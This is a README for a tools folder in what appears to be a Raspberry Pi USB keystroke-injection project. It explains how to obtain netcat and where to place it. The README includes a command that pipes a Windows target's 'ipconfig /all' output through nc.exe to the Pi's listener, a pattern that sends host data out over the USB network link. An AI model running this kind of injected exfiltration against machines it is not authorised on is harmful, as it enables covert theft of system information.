# nc.exe — Required Tool

`nc.exe` (Netcat for Windows) must be placed in this directory before running `POST /bootstrap`
or using `rndis` capture mode.

## Why it's needed

When the Pi types a command like:

```
ipconfig /all | L:\nc.exe 192.168.19.1 9999
```

`nc.exe` pipes the command's output back to the Pi over the RNDIS USB link. Without it,
`rndis` capture mode won't work. The file must be reachable from the target host via the
shared USB drive (PIDRIVE), which Windows sees as a drive letter (e.g. `L:\`).

## Download

Get `ncat.exe` from the official Nmap project — rename it to `nc.exe`:

- **Download page**: https://nmap.org/download.html
- **Direct (Windows installer)**: https://nmap.org/dist/nmap-7.95-setup.exe
  - Install Nmap; grab `ncat.exe` from `C:\Program Files (x86)\Nmap\`

Alternatively, a standalone `nc.exe` build:
- https://github.com/int0x33/nc.exe/ (classic netcat, Windows x86)

## Placement

After downloading, copy the binary to this directory:

```
tools/nc.exe
```

Then either:

**Option A — deploy via deploy.sh** (copies it to the Pi automatically):
```bash
PI_USER=pi ./deploy.sh <pi-ip>
```

**Option B — copy to PIDRIVE manually** once the Pi is plugged into a Windows target
(the shared USB drive appears as a drive letter; the Pi cannot write while the host has it mounted).

## Usage note for ncat

If you use `ncat.exe` (from Nmap), it waits for the connection to close cleanly.
The command syntax is the same — just rename `ncat.exe` to `nc.exe`.
